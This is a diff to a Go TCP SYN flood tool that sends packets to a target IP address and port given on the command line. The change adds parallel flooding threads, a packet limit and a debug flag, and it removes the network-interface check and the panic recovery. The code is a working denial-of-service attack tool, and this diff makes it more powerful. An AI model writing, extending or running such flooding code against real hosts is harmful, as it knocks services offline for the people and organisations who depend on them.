@@ -15,7 +15,12 @@ import (
 	"reflect"
 	"strconv"
 	"strings"
+	"sync"
 )
+
+var debugMode bool
+var packetLimit uint64
+var packetCount uint64
 
 // SYNPacket represents a TCP packet.
 type SYNPacket struct {
@@ -77,7 +82,6 @@ func (tcp *TCPIP) calcTCPChecksum() {
 
 	carryOver := checksum >> 16
 	tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)
-
 }
 
 func (tcp *TCPIP) setPacket() {
@@ -134,7 +138,14 @@ func main() {
 	target := flag.String("t", "", "Target IPV4 address")
 	tport := flag.Uint("p", 0x0050, "Target Port")
 	ifaceName := flag.String("i", "", "Network Interface")
+	debugFlag := flag.Bool("d", false, "Debug mode")
+	maxPacketLimit := flag.Uint64("l", 0, "Packet limit")
+	threads := flag.Int("r", 1, "Additional threads count, how many extra parallel packet senders")
+
 	flag.Parse()
+
+	debugMode = *debugFlag
+	packetLimit = *maxPacketLimit
 
 	if len(*target) < 1 || net.ParseIP(*target) == nil {
 		exitErr(fmt.Errorf("required argument: -t <target IP addr>"))
@@ -146,34 +157,26 @@ func main() {
 		exitErr(fmt.Errorf("invalid port: %d", *tport))
 	}
 
-	var packet = &TCPIP{}
-	var foundIface bool = false
-	foundIfaces := packet.getInterfaces()
-	for _, name := range foundIfaces {
-		if name != *ifaceName {
-			continue
-		}
-		foundIface = true
+	var wg sync.WaitGroup
+
+	for i := 0; i < *threads; i++ {
+		fmt.Println("launching thread")
+		wg.Add(1)
+		var packet = &TCPIP{}
+
+		packet.setTarget(*target, uint16(*tport))
+		packet.genIP()
+		packet.setPacket()
+		packet.Adapter = *ifaceName
+
+		go packet.floodTarget(
+			&wg,
+			reflect.TypeOf(packet).Elem(),
+			reflect.ValueOf(packet).Elem(),
+		)
 	}
 
-	if !foundIface {
-		msg := "Invalid argument for -i <interface> Found: %s"
-		errmsg := fmt.Errorf(msg, strings.Join(foundIfaces, ", "))
-		exitErr(errmsg)
-	}
+	wg.Wait()
 
-	defer func() {
-		if err := recover(); err != nil {
-			exitErr(fmt.Errorf("error: %v", err))
-		}
-	}()
-
-	packet.setTarget(*target, uint16(*tport))
-	packet.genIP()
-	packet.setPacket()
-
-	packet.floodTarget(
-		reflect.TypeOf(packet).Elem(),
-		reflect.ValueOf(packet).Elem(),
-	)
+	fmt.Printf("Sent %d packets\n", packetCount)
 }
